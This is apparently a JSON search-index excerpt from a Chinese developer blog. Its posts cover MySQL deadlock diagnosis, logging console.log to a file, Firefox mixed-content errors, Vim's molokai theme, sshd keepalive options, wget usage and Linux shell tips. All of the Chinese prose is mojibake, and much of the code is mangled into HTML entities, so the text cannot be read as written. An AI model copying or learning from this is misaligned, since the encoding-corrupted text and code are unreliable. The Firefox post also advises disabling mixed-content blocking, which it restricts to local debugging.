æŸ¥çœ‹æ­»é”å’Œè§£é™¤æ­»é”","slug":"mysql-view-deadlock-and-release-deadlock","date":"2020-07-19T08:07:48.000Z","updated":"2020-07-19T09:10:18.298Z","comments":true,"path":"mysql-view-deadlock-and-release-deadlock/","link":"","permalink":"https://www.0x2beace.com/mysql-view-deadlock-and-release-deadlock/","excerpt":"å‰æ®µæ—¶é—´é‡åˆ°äº†ä¸€ä¸ªMysql æ­»é”ç›¸å…³çš„é—®é¢˜ï¼Œæ•´ç†ä¸€ä¸‹ã€‚","text":"å‰æ®µæ—¶é—´é‡åˆ°äº†ä¸€ä¸ªMysql æ­»é”ç›¸å…³çš„é—®é¢˜ï¼Œæ•´ç†ä¸€ä¸‹ã€‚ é—®é¢˜æè¿°ï¼šMysql çš„ä¿®æ”¹è¯­å¥ä¼¼ä¹éƒ½æ²¡æœ‰ç”Ÿæ•ˆï¼ŒåŒæ—¶ä½¿ç”¨Mysql GUI å·¥å…·ç¼–è¾‘å­—æ®µçš„å€¼æ—¶ä¼šå¼¹å‡ºå¼‚å¸¸ã€‚ ä»€ä¹ˆæ˜¯æ­»é”åœ¨è§£å†³Mysql æ­»é”çš„é—®é¢˜ä¹‹å‰ï¼Œè¿˜æ˜¯å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ­»é”ã€‚ æ­»é”æ˜¯æŒ‡ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„è¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­,å› äº‰å¤ºèµ„æºè€Œé€ æˆçš„ä¸€ç§äº’ç›¸ç­‰å¾…çš„ç°è±¡,è‹¥æ— å¤–åŠ›ä½œç”¨,å®ƒä»¬éƒ½å°†æ— æ³•æ¨è¿›ä¸‹å».æ­¤æ—¶ç§°ç³»ç»Ÿå¤„äºæ­»é”çŠ¶æ€æˆ–ç³»ç»Ÿäº§ç”Ÿäº†æ­»é”,è¿™äº›æ°¸è¿œåœ¨äº’ç›¸ç­‰çš„è¿›ç¨‹ç§°ä¸ºæ­»é”è¿›ç¨‹ã€‚ æ­»é”çš„è¡¨ç°æ­»é”çš„å…·ä½“è¡¨ç°æœ‰ä¸¤ç§ï¼š Mysql å¢æ”¹è¯­å¥æ— æ³•æ­£å¸¸ç”Ÿæ•ˆ ä½¿ç”¨Mysql GUI å·¥å…·ç¼–è¾‘å­—æ®µçš„å€¼æ—¶ï¼Œä¼šå‡ºç°å¼‚å¸¸ã€‚ å¦‚ä½•é¿å…æ­»é”é˜»æ­¢æ­»é”çš„é€”å¾„å°±æ˜¯é¿å…æ»¡è¶³æ­»é”æ¡ä»¶çš„æƒ…å†µå‘ç”Ÿï¼Œä¸ºæ­¤æˆ‘ä»¬åœ¨å¼€å‘çš„è¿‡ç¨‹ä¸­éœ€è¦éµå¾ªå¦‚ä¸‹åŸåˆ™ï¼š 1.å°½é‡é¿å…å¹¶å‘çš„æ‰§è¡Œæ¶‰åŠåˆ°ä¿®æ”¹æ•°æ®çš„è¯­å¥ã€‚ 2.è¦æ±‚æ¯ä¸€ä¸ªäº‹åŠ¡ä¸€æ¬¡å°±å°†æ‰€æœ‰è¦ä½¿ç”¨åˆ°çš„æ•°æ®å…¨éƒ¨åŠ é”ï¼Œå¦åˆ™å°±ä¸å…è®¸æ‰§è¡Œã€‚ 3.é¢„å…ˆè§„å®šä¸€ä¸ªåŠ é”é¡ºåºï¼Œæ‰€æœ‰çš„äº‹åŠ¡éƒ½å¿…é¡»æŒ‰ç…§è¿™ä¸ªé¡ºåºå¯¹æ•°æ®æ‰§è¡Œå°é”ã€‚å¦‚ä¸åŒçš„è¿‡ç¨‹åœ¨äº‹åŠ¡å†…éƒ¨å¯¹å¯¹è±¡çš„æ›´æ–°æ‰§è¡Œé¡ºåºåº”å°½é‡ä¿è¯ä¸€è‡´ã€‚ æŸ¥çœ‹æ­»é”Mysql æŸ¥è¯¢æ˜¯å¦å­˜åœ¨é”è¡¨æœ‰å¤šç§æ–¹å¼ï¼Œè¿™é‡Œåªä»‹ç»ä¸€ç§æœ€å¸¸ç”¨çš„ã€‚ 1. æŸ¥çœ‹æ­£åœ¨è¿›è¡Œä¸­çš„äº‹åŠ¡1SELECT * FROM information_schema.INNODB_TRX å¯ä»¥çœ‹åˆ° è¿›ç¨‹idä¸º3175 çš„äº‹åŠ¡åœ¨é”ä½äº†ï¼Œè€Œå¦ä¸€ä¸ªidä¸º3173çš„äº‹åŠ¡æ­£åœ¨æ‰§è¡Œï¼Œä½†æ˜¯æ²¡æœ‰æäº¤äº‹åŠ¡ã€‚ 2. æŸ¥çœ‹æ­£åœ¨é”çš„äº‹åŠ¡1SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCKS; 3. æŸ¥çœ‹ç­‰å¾…é”çš„äº‹åŠ¡1SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCK_WAITS; 4. æŸ¥è¯¢æ˜¯å¦é”è¡¨1SHOW OPEN TABLES where In_use &gt; 0; 5. æŸ¥çœ‹æœ€è¿‘æ­»é”çš„æ—¥å¿—1show engine innodb status åœ¨å‘ç”Ÿæ­»é”æ—¶ï¼Œè¿™å‡ ç§æ–¹å¼éƒ½å¯ä»¥æŸ¥è¯¢åˆ°å’Œå½“å‰æ­»é”ç›¸å…³çš„ä¿¡æ¯ã€‚ è§£é™¤æ­»é”å¦‚æœéœ€è¦è§£é™¤æ­»é”ï¼Œæœ‰ä¸€ç§æœ€ç®€å•ç²—æš´çš„æ–¹å¼ï¼Œé‚£å°±æ˜¯æ‰¾åˆ°è¿›ç¨‹idä¹‹åï¼Œç›´æ¥å¹²æ‰ã€‚ æŸ¥çœ‹å½“å‰æ­£åœ¨è¿›è¡Œä¸­çš„è¿›ç¨‹ã€‚ 1234show processlist&#x2F;&#x2F; ä¹Ÿå¯ä»¥ä½¿ç”¨SELECT * FROM information_schema.INNODB_TRX; ä¸Šé¢ä¸¤ä¸ªå‘½ä»¤æ‰¾å‡ºæ¥çš„è¿›ç¨‹id æ˜¯åŒä¸€ä¸ªã€‚ æ€æ‰è¿›ç¨‹å¯¹åº”çš„è¿›ç¨‹ id 1kill id éªŒè¯ï¼ˆkillåå†çœ‹æ˜¯å¦è¿˜æœ‰é”ï¼‰ 1SHOW OPEN TABLES where In_use &gt; 0; å‚è€ƒé“¾æ¥ Mysql æŸ¥çœ‹è¡¨å’Œè§£é”è¡¨ Mysql æ­»é”æ˜¯ä»€ä¹ˆï¼Ÿ","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"å¦‚ä½•æŠŠ Console.log çš„æ ‡å‡†è¾“å‡ºè®°å½•åˆ°æ–‡ä»¶","slug":"how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file","date":"2020-07-18T08:16:51.000Z","updated":"2020-07-18T08:47:27.103Z","comments":true,"path":"how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/","link":"","permalink":"https://www.0x2beace.com/how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/","excerpt":"æœ€è¿‘é‡åˆ°äº†è¿™æ ·ä¸€ä¸ªéœ€æ±‚ï¼Œåœ¨ä¸æ”¹åŠ¨ä¹‹å‰çš„ä»»ä½•ä¸€è¡Œä»£ç çš„å‰æä¸‹ï¼Œå¦‚ä½•æŠŠconsole.logçš„æ ‡å‡†è¾“å‡ºå…¨éƒ¨è®°å½•åˆ°æ–‡ä»¶ä¸­å‘¢ï¼Ÿ","text":"æœ€è¿‘é‡åˆ°äº†è¿™æ ·ä¸€ä¸ªéœ€æ±‚ï¼Œåœ¨ä¸æ”¹åŠ¨ä¹‹å‰çš„ä»»ä½•ä¸€è¡Œä»£ç çš„å‰æä¸‹ï¼Œå¦‚ä½•æŠŠconsole.logçš„æ ‡å‡†è¾“å‡ºå…¨éƒ¨è®°å½•åˆ°æ–‡ä»¶ä¸­å‘¢ï¼Ÿ æˆ‘æ˜¯æ²¡æœ‰é€‰æ‹©é‚£äº›å¤§åé¼é¼çš„æ—¥å¿—æ¨¡å—ï¼Œå¦‚ï¼š winston - A logger for just about everything. log4js - A port of log4js to node.js å› ä¸ºæˆ‘çš„éœ€æ±‚å¤Ÿç®€å•ï¼Œåªéœ€è¦èƒ½æŠŠæ—¥å¿—è®°å½•åˆ°æ–‡ä»¶å°±è¡Œï¼Œæ‰€ä»¥ä½¿ç”¨äº†ä¸‹é¢è¿™ç§æœ€ç®€å•çš„æ–¹å¼ï¼š 12345678910111213141516var log_file &#x3D; fs.createWriteStream(path.resolve(__dirname, &quot;.pm2&quot;) + &#39;&#x2F;debug.log&#39;, &#123;flags : &#39;w&#39;&#125;);var log_stdout &#x3D; process.stdout;&#x2F;** * é‡è½½console.log å‡½æ•° *&#x2F;console.log &#x3D; function() &#123; var res &#x3D; &quot;&quot;, len &#x3D; arguments.length; for(var i&#x3D;0; i&lt;len; i++)&#123; res +&#x3D; arguments[i]; &#125; log_file.write(util.format(res) + &#39;\\n&#39;); log_stdout.write(util.format(res) + &#39;\\n&#39;);&#125;; å‚è€ƒé“¾æ¥ Node: log in a file instead of the console","categories":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"}]},{"title":"è§£å†³Firefox â€œå·²é˜»æ­¢è½½å…¥æ··åˆæ´»åŠ¨å†…å®¹â€","slug":"resolve-firefox-has-blocked-loading-of-mixed-active-content","date":"2020-07-18T07:15:30.000Z","updated":"2020-09-20T15:40:46.029Z","comments":true,"path":"resolve-firefox-has-blocked-loading-of-mixed-active-content/","link":"","permalink":"https://www.0x2beace.com/resolve-firefox-has-blocked-loading-of-mixed-active-content/","excerpt":"æœ€è¿‘éœ€è¦å°†é¡¹ç›®è¿ç§»è‡³ä¸€å°æ–°çš„æœåŠ¡å™¨ï¼Œå…¶ä¸­æ¶‰åŠåˆ°å¤šä¸ªç«™ç‚¹çš„httpä¸httpsä¹‹é—´çš„è½¬æ¢ã€‚ ç½‘ç«™èµ·åˆä¸èƒ½æ­£å¸¸è®¿é—®æ—¶ï¼Œæˆ‘æ²¡åœ¨æ„ï¼Œä»¥ä¸ºæ˜¯ç½‘ç»œå»¶è¿Ÿï¼ˆå› ä¸ºæœåŠ¡å™¨æ”¾åœ¨å›½å¤–ï¼‰ï¼Œç›´åˆ°æˆ‘æ‰“å¼€æ§åˆ¶å°å‘ç°äº†å¦‚ä¸‹å¼‚å¸¸ï¼š","text":"æœ€è¿‘éœ€è¦å°†é¡¹ç›®è¿ç§»è‡³ä¸€å°æ–°çš„æœåŠ¡å™¨ï¼Œå…¶ä¸­æ¶‰åŠåˆ°å¤šä¸ªç«™ç‚¹çš„httpä¸httpsä¹‹é—´çš„è½¬æ¢ã€‚ ç½‘ç«™èµ·åˆä¸èƒ½æ­£å¸¸è®¿é—®æ—¶ï¼Œæˆ‘æ²¡åœ¨æ„ï¼Œä»¥ä¸ºæ˜¯ç½‘ç»œå»¶è¿Ÿï¼ˆå› ä¸ºæœåŠ¡å™¨æ”¾åœ¨å›½å¤–ï¼‰ï¼Œç›´åˆ°æˆ‘æ‰“å¼€æ§åˆ¶å°å‘ç°äº†å¦‚ä¸‹å¼‚å¸¸ï¼š è¿™æ—¶æˆ‘æ‰æ„è¯†åˆ°å¹¶ä¸æ˜¯ç½‘ç»œå»¶è¿Ÿçš„é—®é¢˜ï¼Œè€Œæ˜¯é¡¹ç›®æ²¡æœ‰é…ç½®å¥½ã€‚ ä»€ä¹ˆæ˜¯æ··åˆå†…å®¹ å½“ç”¨æˆ·è®¿é—®ä½¿ç”¨HTTPSçš„é¡µé¢æ—¶ï¼Œä»–ä»¬ä¸webæœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥æ˜¯ä½¿ç”¨SSLåŠ å¯†çš„ï¼Œä»è€Œä¿æŠ¤è¿æ¥ä¸å—å—…æ¢å™¨å’Œä¸­é—´äººæ”»å‡»ã€‚å¦‚æœHTTPSé¡µé¢åŒ…æ‹¬ç”±æ™®é€šæ˜æ–‡HTTPè¿æ¥åŠ å¯†çš„å†…å®¹ï¼Œé‚£ä¹ˆè¿æ¥åªæ˜¯è¢«éƒ¨åˆ†åŠ å¯†ï¼šéåŠ å¯†çš„å†…å®¹å¯ä»¥è¢«å—…æ¢è€…å…¥ä¾µï¼Œå¹¶ä¸”å¯ä»¥è¢«ä¸­é—´äººæ”»å‡»è€…ä¿®æ”¹ï¼Œå› æ­¤è¿æ¥ä¸å†å—åˆ°ä¿æŠ¤ã€‚å½“ä¸€ä¸ªç½‘é¡µå‡ºç°è¿™ç§æƒ…å†µæ—¶ï¼Œå®ƒè¢«ç§°ä¸ºæ··åˆå†…å®¹é¡µé¢ã€‚ â€”â€” MDN é€šä¿—ä¸€ç‚¹è§£é‡Šå°±æ˜¯ï¼šhttps çš„é¡µé¢ä¸­æ··åˆç€http çš„è¯·æ±‚ï¼Œè€Œè¿™ç§è¯·æ±‚ä¸ä¼šè¢«æµè§ˆå™¨æ­£å¸¸æ¥å—çš„ï¼Œä¹Ÿè¢«ç§°ä½œä¸ºæ··åˆå†…å®¹é¡µé¢ã€‚ è§£å†³æ–¹æ¡ˆæ—¢ç„¶å·²ç»æ˜ç™½äº†ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿè¿™ä¸ªé—®é¢˜ï¼Œé‚£ä¹ˆè¦è§£å†³èµ·æ¥ä¹Ÿå°±éå¸¸ç®€å•äº†ã€‚ è®©Firefoxæš‚æ—¶ä¸é˜»æ­¢ æ‰“å¼€æ–°æ ‡ç­¾é¡µï¼Œåœ¨åœ°å€æ è¾“å…¥ about:configï¼Œè¿›å…¥FireFoxé«˜çº§é…ç½®é¡µé¢ã€‚ æœç´¢security.mixed_content.block_active_contentï¼Œå°†é»˜è®¤å€¼trueæ›´æ”¹ä¸ºfalseã€‚ è¿™ç§æ–¹å¼ä»…é€‚ç”¨äºæœ¬åœ°è°ƒè¯•ã€‚ é¿å…åœ¨HTTPSé¡µé¢ä¸­åŒ…å«HTTPçš„å†…å®¹æ›´ç›´æ¥æœ‰æ•ˆçš„æ–¹å¼åº”è¯¥æ˜¯çº¦å®šå¥½é¡¹ç›®ä¸­çš„åè®®ï¼Œç»Ÿä¸€ä½¿ç”¨httpsæˆ–è€…httpã€‚ å‚è€ƒè¿æ¥ ä»€ä¹ˆæ˜¯æ··åˆå†…å®¹â€”â€”MDN httpsè®¿é—®é‡åˆ°â€œå·²é˜»æ­¢è½½å…¥æ··åˆå†…å®¹â€","categories":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"}]},{"title":"Vim å®‰è£… molokai é…è‰²æ–¹æ¡ˆ","slug":"vim-install-molokai-color-scheme","date":"2020-07-18T06:36:04.000Z","updated":"2020-07-18T06:38:53.741Z","comments":true,"path":"vim-install-molokai-color-scheme/","link":"","permalink":"https://www.0x2beace.com/vim-install-molokai-color-scheme/","excerpt":"åƒsolarizedã€gruvboxã€ molokaiã€è¿™äº›éƒ½æ˜¯å¤§åé¼é¼çš„VIM é…è‰²æ–¹æ¡ˆï¼Œæœ¬æ–‡åªä»‹ç»å¦‚ä½•å®‰è£… molokai ã€‚","text":"åƒsolarizedã€gruvboxã€ molokaiã€è¿™äº›éƒ½æ˜¯å¤§åé¼é¼çš„VIM é…è‰²æ–¹æ¡ˆï¼Œæœ¬æ–‡åªä»‹ç»å¦‚ä½•å®‰è£… molokai ã€‚ æŒ‰ç…§é¡ºåºæ‰§è¡Œå®Œä¸Šé¢çš„å‘½ä»¤ï¼Œå³å¯ä½¿ç”¨æœ€ç»å…¸çš„é…è‰²æ–¹æ¡ˆäº†ã€‚ 1234567cd ~mkdir .vim &amp;&amp; cd .vimgit clone https:&#x2F;&#x2F;github.com&#x2F;tomasr&#x2F;molokai.gitcp -rf molokai&#x2F;colors&#x2F; .&#x2F;colorsecho colorscheme molokai &gt;&gt; ~&#x2F;.vimrcecho set t_Co&#x3D;256 &gt;&gt; ~&#x2F;.vimrcecho set background&#x3D;dark &gt;&gt; ~&#x2F;.vimrc å®é™…æ•ˆæœï¼š","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Vim","slug":"Vim","permalink":"https://www.0x2beace.com/tags/Vim/"}]},{"title":"sshd_config å¸¸ç”¨é…ç½®é¡¹","slug":"sshd-config-common-configuration-items","date":"2020-07-17T15:17:09.000Z","updated":"2020-07-17T15:18:28.234Z","comments":true,"path":"sshd-config-common-configuration-items/","link":"","permalink":"https://www.0x2beace.com/sshd-config-common-configuration-items/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ”¶å½•é‚£äº›å¸¸ç”¨çš„sshd_configé…ç½®é¡¹ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ”¶å½•é‚£äº›å¸¸ç”¨çš„sshd_configé…ç½®é¡¹ã€‚ ä¿æŒé“¾æ¥ä¿æŒå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´çš„è¿æ¥ä¿æŒæ´»åŠ¨çŠ¶æ€ä¼¼ä¹æ˜¯æœ€å¸¸è§ç­–ç•¥ã€‚ ServerAliveIntervalï¼šå®¢æˆ·ç«¯åœ¨å‘æœåŠ¡å™¨å‘é€ç©ºæ•°æ®åŒ…ä¹‹å‰ï¼ˆç­‰å¾…è¿æ¥ä¿æŒæ´»åŠ¨çŠ¶æ€ï¼‰å°†ç­‰å¾…çš„ç§’æ•°ã€‚ ClientAliveIntervalï¼šæœåŠ¡å™¨åœ¨å‘å®¢æˆ·ç«¯å‘é€ç©ºæ•°æ®åŒ…ä¹‹å‰ï¼ˆç­‰å¾…è¿æ¥ä¿æŒæ´»åŠ¨çŠ¶æ€ï¼‰å°†ç­‰å¾…çš„ç§’æ•°ã€‚ è®¾ç½®ä¸º0ï¼ˆé»˜è®¤å€¼ï¼‰å°†ç¦ç”¨è¿™äº›åŠŸèƒ½ï¼Œå› æ­¤å¦‚æœç©ºé—²æ—¶é—´å¤ªé•¿ï¼Œè¿æ¥å¯èƒ½ä¼šæ–­å¼€ã€‚ 12345Host myhostshortcut HostName myhost.com User barthelemy ServerAliveInterval 60 ServerAliveCountMax 10 è¿™ä¹ˆè®¾ç½®çš„ä½œç”¨æ˜¯ï¼šå®¢æˆ·ç«¯å°†ç­‰å¾…ç©ºé—²60ç§’é’Ÿï¼ˆServerAliveIntervalæ—¶é—´ï¼‰ï¼Œç„¶åå‘æœåŠ¡å™¨å‘é€ no-op nullæ•°æ®åŒ…ï¼Œå¹¶æœŸå¾…å“åº”ã€‚ å¦‚æœæ²¡æœ‰å“åº”ï¼Œåˆ™å®ƒå°†ç»§ç»­å°è¯•ä¸Šè¿°è¿‡ç¨‹ç›´åˆ°10æ¬¡ï¼ˆServerAliveCountMax æ¬¡æ•° 10 * 60 = 600ç§’ï¼‰ã€‚å¦‚æœæœåŠ¡å™¨ä»ç„¶æ²¡æœ‰å“åº”ï¼Œåˆ™å®¢æˆ·ç«¯å°†æ–­å¼€sshè¿æ¥ã€‚ å‚è€ƒé“¾æ¥ å¦‚ä½•è®©sshå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¿æŒè¿æ¥ sshd_config å‚è€ƒæ‰‹å†Œ","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å‘½ä»¤æ•´ç†","slug":"Linux/å‘½ä»¤æ•´ç†","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"ssh","slug":"ssh","permalink":"https://www.0x2beace.com/tags/ssh/"}]},{"title":"Wget ä½¿ç”¨æŠ€å·§","slug":"wget-tips","date":"2020-07-16T15:30:39.000Z","updated":"2020-07-16T15:31:23.790Z","comments":true,"path":"wget-tips/","link":"","permalink":"https://www.0x2beace.com/wget-tips/","excerpt":"wget æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œçš„ä¸‹è½½å·¥å…·ï¼Œå¯¹äºç»å¸¸ä½¿ç”¨Linuxçš„ç”¨æˆ·æ¥è¯´ï¼ŒçœŸæ˜¯å†ç†Ÿæ‚‰ä¸è¿‡äº†ã€‚ä¸‹é¢æ€»ç»“äº†ä¸€äº›å®ç”¨çš„wgetä½¿ç”¨æŠ€å·§ï¼Œå¯èƒ½ä¼šè®©ä½ æ›´åŠ é«˜æ•ˆåœ°ä½¿ç”¨ wgetã€‚","text":"wget æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œçš„ä¸‹è½½å·¥å…·ï¼Œå¯¹äºç»å¸¸ä½¿ç”¨Linuxçš„ç”¨æˆ·æ¥è¯´ï¼ŒçœŸæ˜¯å†ç†Ÿæ‚‰ä¸è¿‡äº†ã€‚ä¸‹é¢æ€»ç»“äº†ä¸€äº›å®ç”¨çš„wgetä½¿ç”¨æŠ€å·§ï¼Œå¯èƒ½ä¼šè®©ä½ æ›´åŠ é«˜æ•ˆåœ°ä½¿ç”¨ wgetã€‚ é‡å‘½åæœ€å¸¸è§çš„ä½¿ç”¨æ–¹å¼ï¼š 1$ wget http:&#x2F;&#x2F;example.com&#x2F;filename.txt wgeté»˜è®¤ä¼šä»¥æœ€åä¸€ä¸ªç¬¦åˆ / çš„åé¢çš„å­—ç¬¦æ¥å¯¹ä¸‹è½½æ–‡ä»¶å‘½åï¼Œå¯¹äºåŠ¨æ€é“¾æ¥çš„ä¸‹è½½é€šå¸¸æ–‡ä»¶åä¼šä¸æ­£ç¡®ã€‚ å¦‚æœå¸Œæœ›å¯¹è¿™ä¸ªä¸‹è½½çš„æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‚æ•° -O æ¥æŒ‡å®šä¸€ä¸ªæ–‡ä»¶åï¼š 1$ wget -O file.zip http:&#x2F;&#x2F;example.com&#x2F;filename.txt åå°ä¸‹è½½å½“éœ€è¦ä¸‹è½½æ¯”è¾ƒå¤§çš„æ–‡ä»¶æ—¶ï¼Œä½¿ç”¨å‚æ•° -b å¯ä»¥éšè—åœ¨åå°è¿›è¡Œä¸‹è½½ï¼š 1$ wget -b http:&#x2F;&#x2F;wppkg.baidupcs.com&#x2F;issue&#x2F;netdisk&#x2F;MACguanjia&#x2F;BaiduNetdisk_mac_3.2.0.9.dmg ç„¶åå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å½“å‰çš„è¿›åº¦ï¼š 1$ tail -f wget-log ä¸‹è½½ç›®å½•è¿™æ¡å‘½ä»¤å¯ä»¥ä¸‹è½½ http://example.com ç½‘ç«™ä¸Š packages ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ã€‚ å‚æ•°è¯´æ˜ï¼š -rï¼šä¸‹è½½ç›®å½• -npï¼šä¸éå†çˆ¶ç›®å½• -ndï¼šä¸åœ¨æœ¬æœºé‡æ–°åˆ›å»ºç›®å½•ç»“æ„ 1$ wget -r -np -nd http:&#x2F;&#x2F;example.com&#x2F;packages&#x2F; ä¸ä¸Šä¸€æ¡å‘½ä»¤ç›¸ä¼¼ï¼Œä½†å¤šåŠ äº†ä¸€ä¸ª --accept=iso é€‰é¡¹ï¼Œè¿™æŒ‡ç¤º wget ä»…ä¸‹è½½ i386 ç›®å½•ä¸­æ‰€æœ‰æ‰©å±•åä¸º iso çš„æ–‡ä»¶ã€‚ä½ ä¹Ÿå¯ä»¥æŒ‡å®šå¤šä¸ªæ‰©å±•åï¼Œåªéœ€ç”¨é€—å·åˆ†éš”å³å¯ã€‚ 1$ wget -r -np -nd --accept&#x3D;iso http:&#x2F;&#x2F;example.com&#x2F;centos-5&#x2F;i386&#x2F; æ‰¹é‡ä¸‹è½½æ­¤å‘½ä»¤å¸¸ç”¨äºæ‰¹é‡ä¸‹è½½çš„æƒ…å½¢ï¼ŒæŠŠæ‰€æœ‰éœ€è¦ä¸‹è½½æ–‡ä»¶çš„åœ°å€æ”¾åˆ° filename.txt ä¸­ï¼Œç„¶å wget å°±ä¼šè‡ªåŠ¨ä¸ºä½ ä¸‹è½½æ‰€æœ‰æ–‡ä»¶äº†ã€‚ 1$ wget -i filename.txt æ–­ç‚¹ç»­ä¼ é€šå¸¸æˆ‘ä»¬åœ¨ä¸‹è½½å¤§æ–‡ä»¶æ—¶ï¼Œä¸ºäº†é˜²æ­¢ä¸­é€”å› ä¸ºç½‘ç»œä¸ç¨³å®šç­‰å› ç´ æ‰€å¼•èµ·çš„ä¸‹è½½å¤±è´¥ï¼Œå¯ä»¥ä½¿ç”¨ -c å‚æ•°ï¼Œä½œä¸ºæ–­ç‚¹ç»­ä¼ ã€‚ å¥½å¤„æ˜¯ï¼šå¦‚æœå½“æ—¶ä¸‹è½½å¤±è´¥äº†ï¼Œä¹‹åå†æ¬¡ä¸‹è½½è¯¥æ–‡ä»¶æ—¶ï¼Œä¼šç»§ç»­ä¸Šä¸€æ¬¡çš„ä¸‹è½½ï¼Œè€Œä¸ç”¨é‡å¤´ä¸‹è½½äº†ã€‚ 1$ wget -c http:&#x2F;&#x2F;example.com&#x2F;really-big-file.iso å…¶ä»–è¯¥å‘½ä»¤å¯ç”¨æ¥é•œåƒä¸€ä¸ªç½‘ç«™ï¼Œwget å°†å¯¹é“¾æ¥è¿›è¡Œè½¬æ¢ã€‚å¦‚æœç½‘ç«™ä¸­çš„å›¾åƒæ˜¯æ”¾åœ¨å¦å¤–çš„ç«™ç‚¹ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ -H é€‰é¡¹ 1$ wget -m -k (-H) http:&#x2F;&#x2F;www.example.com&#x2F; å‚è€ƒé“¾æ¥ wget ä½¿ç”¨æŠ€å·§","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"å‘½ä»¤æ•´ç†","slug":"Linux/å‘½ä»¤æ•´ç†","permalink":"https://www.0x2beace.com/categories/Linux/%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"ä¸€äº›å®ç”¨çš„ Linux å‘½ä»¤","slug":"some-practical-linux-commands","date":"2020-07-16T15:26:13.000Z","updated":"2020-09-05T02:10:46.310Z","comments":true,"path":"some-practical-linux-commands/","link":"","permalink":"https://www.0x2beace.com/some-practical-linux-commands/","excerpt":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯ç”¨æ¥æ•´ç†é‚£äº›ä¸å¸¸ç”¨ä½†åˆå¾ˆå®ç”¨çš„Linux å‘½ä»¤ã€‚","text":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯ç”¨æ¥æ•´ç†é‚£äº›ä¸å¸¸ç”¨ä½†åˆå¾ˆå®ç”¨çš„Linux å‘½ä»¤ã€‚ sudo !!æœ‰æ—¶å€™æˆ‘ä»¬å¥½ä¸å®¹æ˜“è¾“å®Œä¸€é•¿ä¸²å‘½ä»¤ï¼Œå´è¢«æç¤ºâ€æƒé™ä¸è¶³â€ï¼Œå¦‚æœè¿™ä¸ªæ—¶å€™æœ‰ä¸€ä¸ªå‘½ä»¤è®°ä½ä¸Šä¸€æ¬¡çš„è¾“å…¥å†…å®¹é‚£è¯¥å¤šå¥½ã€‚ è¿˜çœŸæœ‰ï¼Œ!!å‘½ä»¤å¯ä»¥è·å–æœ€åä¸€æ¬¡è¾“å…¥çš„å‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¾“å…¥ä¸‹é¢è¿™ä¸ªå‘½ä»¤å°±å¯ä»¥äº†ã€‚ 1$ sudo !! æ³¨æ„ä¸­é—´æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚ nlnl å‘½ä»¤ç±»ä¼¼catå‘½ä»¤ï¼Œéƒ½æ˜¯æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œä½†ä¸åŒä¹‹å¤„åœ¨äºï¼šnlå‘½ä»¤ä¼šåœ¨æ–‡æœ¬å†…å®¹çš„æ¯ä¸€è¡Œå‰é¢ï¼Œæ·»åŠ è¡Œå·ã€‚ 123456$ cat test.txtboomac$ nl test.txt1. boo2. mac treeä»¥æ ‘çŠ¶çš„å½¢å¼è¿”å›å½“å‰ç›®å½•çš„æ–‡ä»¶å¤¹ç»“æ„ï¼Œè¿™ä¸ªå‘½ä»¤å¾ˆå¥½ç”¨ã€‚ 12345$ tree .â””â”€â”€ test.txt0 directories, 1 file pstreeå’Œtreeç±»ä¼¼ï¼Œä¸è¿‡å®ƒæ˜¯è¿”å›å½“å‰è¿è¡Œçš„æ‰€æœ‰è¿›ç¨‹åŠå…¶ç›¸å…³çš„å­è¿›ç¨‹çš„æ 